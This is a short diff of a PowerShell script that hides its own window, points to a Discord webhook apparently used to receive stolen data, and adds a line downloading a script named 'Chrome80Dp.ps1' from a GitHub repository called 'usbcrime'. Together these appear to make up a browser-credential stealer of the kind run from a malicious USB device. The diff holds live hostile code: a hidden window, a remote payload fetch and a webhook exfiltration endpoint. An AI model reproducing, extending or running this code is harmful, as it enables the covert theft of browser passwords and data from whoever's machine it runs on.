@@ -12,7 +12,7 @@ else{
     $hwnd = $Proc.MainWindowHandle
     $Type::ShowWindowAsync($hwnd, 0)
 }
-
+iwr -Uri 'https://raw.githubusercontent.com/bindas88/usbcrime/main/Chrome80Dp.ps1'
 sleep 1
 $hookurl = "https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC"
 # shortened URL Detection
